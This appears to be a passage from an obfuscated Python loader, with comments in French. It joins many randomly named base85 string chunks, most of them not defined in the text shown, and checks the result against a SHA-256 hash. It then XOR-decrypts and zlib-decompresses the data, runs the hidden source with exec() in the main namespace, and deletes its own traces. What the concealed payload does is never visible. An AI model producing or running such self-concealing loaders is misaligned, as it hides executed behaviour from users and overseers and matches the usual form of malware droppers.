_cbUOS0n86j2yZK = 'K?ZBY-A3Sw4;L<4cUkA6M&|TWme3`yLyh+{LrzRRvs9>M>01}4NN?'
_ct5N5v54owbT9T = 'OpyT=n<eD#p<@{U8ioZ6$kKjTNf=u~>j#9_RVci_dEsmEc#Jqljkn'
_clOGJIXN3utgIO = '?91aL)B9{v{DirBOXTL^n6=(Rvfnk&``S?aWkh#rx6v7d79B}SN1y'
_cnF7iTioPSpHmp = 'xQ9yN42^0tVhT=ts(TS>fHa7I-R?qY$YdX=AwSWO5uTTr!9V^#85k'
_cbkXxcQ3gCYTf1 = 'cWiI|!5`{ccgP)k!}a1h1|&Y8^W*FjldA8s({>$;FsxQUN<z!h)Lh'
_cdYRFRRVFAGACj = 'frX|wcPu;wCzt}`?3oLyp>C>1ak?cT76<@C{W#&_0>N&Q=s#n-FGT'
_csgCZGi2kf6CnO = '~>Awf3K?XKb(H!@%UB;Cb@YFo0y`qpXaULw3en_{)1l|{UQTp@Prz'
_cak8XNZEGky1Le = 's-JcvCv+XecCsmxtRJDVEwmOVv;u%%sG5efRx`jN&E-%EycLu$nR{'
_chMQiAMGUYfacc = 'U+q}LlrkD%|N&=pHY@bchyy=j{U@#d;JD`cewh^p92?IoVj{5=6_)'
_cg4LTo2uINmxvg = 'K*kdM1FB3=6kG?3Hf|DUUGFb0A=&iG#B|PGb5;%-2ZdXBk#brI<1@'
_cw1SiajpdNGpwX = '(T}IAPR^ip>W=HE|9;#c2`va5l<CpifK3J;4V#{3ON=R;`eTm5z0I'
_cras2NmxuSj9b_ = 'rRln-=H)o!g-<Bj4C*oLwCPREb*K7YKshHMG8NB6tpA;3N+Km9g?h'
_ccPI5L2xOJSdJK = 'V|IF@0m6I{KCGIzWgl6HUpfZ`N|nwxa`amOwIOx!mYgxEv$79;2-p'
_c_B9vrpnv1ZOBZ = 'NuX5##fDK&SVe7RVPvOi9LY+yertT4rp;}n9dUtBYKb?7Wo&D0eh}'
_cmB6kr_JXMASOi = 'q~rU(dzhDedXwu->JfxEt_<X)aU8<xr~HT8|;?ca7YCX$m947lION'
_cuaRslvTVAqya4 = 'Z5xo}2C>G#Sq8AspZw=OfWoX1#EfiJWoD~j1ay3j@>m$~?PFGlw*%'
_cmr2PP8w_frfmA = '7R7g&7i5p9iv)dU9e?!~XQN!7Y+F*Cqm`Am^7I{*MutzRGFQ2Wg^e'
_cmaFBJeYT78bJ5 = 'MqLzVPcX@fnO6FK`bNWrfrLv&?wlYzfH58;?uX<*{#`I`we|Db3%U'
_cdBVOFAvUrxOBh = '}1SO3>(WU<iZ0ur7EAJh;Gm%lPoPZx1?8-7s@sMC^_89P(aD;L^r~'
_cgCryJ0Lx5cVuJ = '1-U$W{q3tv5N0R7j-9m)r=}S|VkZhCc'

_psXPuDFW51B9S3 = __import__('base64').b85decode(_cvO9D3vhQ8YXgG + _cnXkhamoUukQ2S + _cf3NILwWvVnct5 + _cls1IUT5FDGonq + _cgr12Y0OVVW_Uo + _cyl1UWG43qBINe + _cmhmN9ymK2zvSP + _cf2fv1I4h5sfgp + _cgNVBnLnHn4CZd + _cgUk9RWrddcgp1 + _cxyjDU2y52cqt0 + _cbaa6JrfeopRvn + _csewHNnX3ZmOMn + _cjrOVeyMW7Vcqz + _ceDRnPvPzGnMeN + _cvlJLbCUwUA40n + _cd2d0yhVaITnGj + _c_ob8HGcNgSGw6 + _cboZMiwyf5Gnmg + _ca97O3WPMvNTbs + _c_FNrG2gYPNDhM + _cy1QgID6gSG5EW + _cjTMQzW3E8NAF_ + _ckrHT3Io82xN9x + _ciq0R9Jdwrp64W + _cuP5__4S0op7u8 + _cx5ghfWUYtZ8wT + _ccXF6BKlH2JVOh + _ccDllD7dpyhGy2 + _cdwlMSxQ5oD9qJ + _cnLO_orTy20izA + _cliZxtTdHW8xTh + _cqRnQbSu0c4rYF + _crJhhU4ZyaNSJx + _ca2d6NO1RqVJQp + _clqUMQiIQREwMd + _ca7mXznBa13KGv + _cqzqVkA8Smt57E + _ctDsAXnVFWEpsX + _ctn52nXA0V2UY5 + _cr2NHXrEsgoBQA + _ci_oniqoTKo0F8 + _ceT2LxYSjxGqrw + _cozYPDroLjHp4b + _ciwlm1GAYDCEdG + _chvwp1CCoFzKIN + _cm1TeSTddnHZh0 + _chGFaZrJUAZAij + _cj2hE7ssunzpYK + _cjAi3e8mpboh5J + _c_0xFXuVm521Ql + _csgKg_JrWozjnI + _cjRzp98ZTSyig7 + _cxvXHY_ZYQpdGB + _ckN21KST_jfqiG + _cxfW1dfP8q0Zrp + _cwM0nyvLbFpQn6 + _cpzvcBv1V4Nu0E + _coxrNzgZSyQeh0 + _cbI57Vt0t0JC6s + _cpp74w5OpFa9Pp + _cjHG_mWPiG8TIl + _chnm7iAfk46pTJ + _cpnzIRNDotWQnj + _cumThMwztUaalD + _cuvSqr4619y0Le + _cgNkUxB5IYuLhc + _ckZoTOlHapN_W4 + _c_27dHbM8VBhkB + _crKmQtyvf0pvju + _cyIdbO1qS9xRH4 + _c_Maoi_lpSiGme + _cq_EF1rAtyruLU + _cuN3PJFWq7hRtI + _cbXWcYh8FuzxqP + _c_Qkn_5x49z8YI + _crI8ppKmekb1Cs + _ccjbXhw4grfkSM + _cucmk0EQUjcUDe + _czBwulD84OTAPP + _crkORfMqKelBiY + _chxJbZtEl1BQ4u + _cjmHtLswFaJPLq + _ctxICkYxYsiPho + _cfLOl_a0Qwiwc7 + _czKSMX2rlOO8Hy + _cowgQnVIPIJQr7 + _copy3U3kFxFyqf + _cagFztVN_MA6Dc + _cawKG6mlGCvRZ5 + _czdXIyH4xsgbzq + _ccMM8To5FCxt9O + _cgHHtIj1M4B7Xh + _cjUSIXFaFdGVUd + _cdVGEm_4wgUTiC + _cnX8cOnhbeaatV + _cf6K3NA2Wpyu0C + _cdSAWHtvhAaf8T + _cbI_gQb27oIQJM + _cuA5K08LKCJOun + _ckpDnWO22O8wpj + _cnZyFmOOtajc2b + _cfnM7Oj_CzpEUL + _cx7ta_KEj5Ardj + _cxk5733TlNd4eU + _ckWKwHJ3cYhCKr + _cvcbLAG5GtG_8v + _cf2kh1KoR5ggzB + _ctzEGsHOwNMbCZ + _cssd8xJ8wHIFcF + _ctpROjGdJUIazz + _cn01o4ymjfWh3F + _c_QdCppEkYFp5L + _cmJ01bhW6Ba0t9 + _cjZ2d0_WRTADTZ + _chfgcu8qg8FEEQ + _ctj7zb0cL0G4Ti + _cnNQbfvEqBzxHS + _ccLlsJAx1U1CZW + _cpdOEyfuW0jAlv + _ckpAKy6ATYkXXL + _chsAoQfZ49WN8o + _cnoZEmg5_qPvmi + _cv9lobuNMR54__ + _clmdjYAsVXdNI3 + _crrZv3xRD8IGrI + _cu0mE6Rowv27ek + _cvtGQ6JZTYaK55 + _chleUbdE3re077 + _cwRw4y__hUzsaM + _cpG287KIYGVZg7 + _cj2q_5vzLCI45L + _csfJ9k9CU50mzI + _cxkRJ9RbNRRSOd + _cmNsfoUM4iKHFy + _cmhDX80dPlGZiC + _czrfKDgbR0UNL_ + _ckfdhuT1LbOF_r + _cmStmHNrmvmoan + _ckxbOsj2lxYvfx + _cg8VgO_vptsy_N + _csgYe3cDLCtYJH + _cqeU9ohGz4NUHW + _cje8BVfDpP8mOz + _co5Gk1lD_69G01 + _ceyAn8hnYV1Wkd + _cnGbr8kHmz4pmT + _chRZoGPoGwbylb + _cw8_o3BE6tOv3G + _cbt_E9iLWkL1up + _cz4VpHiK2AKk5L + _cjBFtUMerKUxIH + _cjI0v75X0rV1dB + _cypwKTtpB1dwoX + _cvLGkvDnIS3Kbw + _c_hwuhF7RrpQjv + _cuM1Sct5lRS42o + _clOAWpp_KdWpX8 + _cozBS1Zl5j1GMq + _cw5d2LLduSksue + _c_ss77f1OvLT7l + _cc4XpJoMcdEa8P + _czy79NCHnagJWr + _coGZRVdUE5DgJj + _ci15x796zlqHke + _cdH1O4raHUNzxh + _ccCBh5GYH0Qv0v + _cmyf9qXL58ocIP + _cb9sqjMP36BR96 + _ceBW4KL4kidvyi + _cgeSz4AEpqJiZK + _cxABBe27wqpofB + _c_oqgmZOoEZVFR + _cjyK0Hj_Z0sGgh + _cdQpCkWdnMTBJ7 + _crNJsMYY1u3JMX + _ccCLeO7vVGHrBW + _cq9_Amr5aYFkIm + _cefzDl2lxwhdma + _cksDEr3qG6RrbE + _cnOO5xbQVxBfUq + _cxGSQpqONmTIRc + _c_UWSh5n4cRCc5 + _cltNdqxxVnF4Gt + _cjgSvMVOUuOQbP + _coMQZo7EOMASFn + _crP76SzpCjtDsp + _cvayJVKEYphD6x + _cmEWiZZf0M2pwl + _chMjCyISf2k2XP + _co9k_R_NifSV7z + _csMXCQB9ko9ALr + _c_xrHJkyIyuwok + _ccGs5sFIFyVloU + _catEBHOk_Mbmqh + _cxzERsxDm4QVqI + _cysHdURrodrIbE + _cmxthDTvJIh9Nf + _cqC3OGD69lHUJj + _cj6Icco5pQKlkC + _cbUOS0n86j2yZK + _ct5N5v54owbT9T + _clOGJIXN3utgIO + _cnF7iTioPSpHmp + _cbkXxcQ3gCYTf1 + _cdYRFRRVFAGACj + _csgCZGi2kf6CnO + _cak8XNZEGky1Le + _chMQiAMGUYfacc + _cg4LTo2uINmxvg + _cw1SiajpdNGpwX + _cras2NmxuSj9b_ + _ccPI5L2xOJSdJK + _c_B9vrpnv1ZOBZ + _cmB6kr_JXMASOi + _cuaRslvTVAqya4 + _cmr2PP8w_frfmA + _cmaFBJeYT78bJ5 + _cdBVOFAvUrxOBh + _cgCryJ0Lx5cVuJ)
if __import__('hashlib').sha256(_psXPuDFW51B9S3).hexdigest() != '5d06d571e14bc4955a6424c3a0051aadf8b24fa6233415573eab1c85bc0fb727':
    __import__('sys').exit(1)
_xySuCe8VzpiFwf = bytes([17, 45, 177, 244, 98, 227, 71, 39, 88, 102, 29, 67, 126, 165, 45, 82, 55, 73, 18])
_fkau8Nemi9Y2UEC = bytes([243, 92, 189, 211, 224, 161, 245, 216, 15, 154, 3, 135, 8, 145, 127, 26, 48, 159, 71])

def _fxzJTeWVAxryaao(_bah6N2ktMHEx14, _k_vzxdGWKTI2g7):
    return bytes(_bah6N2ktMHEx14[_iiQH7oboeF9_A6] ^ _k_vzxdGWKTI2g7[_iiQH7oboeF9_A6 % len(_k_vzxdGWKTI2g7)] for _iiQH7oboeF9_A6 in range(len(_bah6N2ktMHEx14)))

def _fdbcKG0JiFVInMS(_tnHnv4N9RQ_vaQ):
    import zlib
    return zlib.decompress(_tnHnv4N9RQ_vaQ) # Un seul niveau de zlib ici pour simplifier

def _feaPms_vXmVUnds():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xaZ4wgwH06hoCf = _fxzJTeWVAxryaao(_psXPuDFW51B9S3, _xySuCe8VzpiFwf)
    # 2. Décompression Zlib
    _dgHjrtgOUIwku1 = _fdbcKG0JiFVInMS(_xaZ4wgwH06hoCf)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dgHjrtgOUIwku1.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nj8cqTzRhHpnIG = _main.__dict__
    _nj8cqTzRhHpnIG.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nj8cqTzRhHpnIG)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feaPms_vXmVUnds()
try:
    del _fxzJTeWVAxryaao, _fdbcKG0JiFVInMS, _feaPms_vXmVUnds
    del _psXPuDFW51B9S3, _xySuCe8VzpiFwf, _fkau8Nemi9Y2UEC
except:
    pass
